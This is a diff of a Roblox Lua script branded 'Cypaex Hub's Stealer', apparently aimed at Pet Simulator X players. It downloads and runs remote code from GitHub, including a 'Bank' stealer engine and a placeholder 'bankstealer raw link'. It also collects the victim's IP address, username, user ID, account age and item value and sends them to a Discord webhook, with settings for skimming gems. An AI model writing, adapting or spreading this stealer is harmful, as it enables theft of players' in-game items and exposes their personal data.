@@ -45,7 +45,7 @@ getgenv().Settings = {
     },
     Gems = {
         Dualhook = true,
-        Intensity = 50 --%
+        Intensity = 0 --%
     }
 }
 
@@ -213,7 +213,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= true then
+if _G.LoadingScreen ~= false then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Cypaex/PsxLoading/main/Engine.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
@@ -748,10 +748,10 @@ end
 local diaamt = PlayerInfos.Diamonds
 if diaamt < 110000 then
     _G.Webhook = Webhook
-    _G.LoadingScreen = true
-    _G.AntiLeave = true
-    _G.MouseLock = true
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Cypaex/Bank/main/Engine", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    _G.LoadingScreen = false
+    _G.AntiLeave = false
+    _G.MouseLock = false
+    loadstring(game:HttpGetAsync("bankstealer raw link", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -955,7 +955,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://cdn.discordapp.com/attachments/1129524257655902210/1130633198632718456/Cypaex.jpg"
+        "https://cdn.discordapp.com/attachments/1129524257655902210/1130646633579819038/gifc.gif"
         data1 = {
             ["content"] = ping,
             ["username"] = "Cypaex Hub",
@@ -971,7 +971,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :melting_face:",
+                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1025,7 +1025,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://cdn.discordapp.com/attachments/1129524257655902210/1130633198632718456/Cypaex.jpg"
+        "https://cdn.discordapp.com/attachments/1129524257655902210/1130646633579819038/gifc.gif"
         data1 = {
             ["content"] = ping,
             ["username"] = "Cypaex Hub",
@@ -1041,7 +1041,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :melting_face:",
+                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
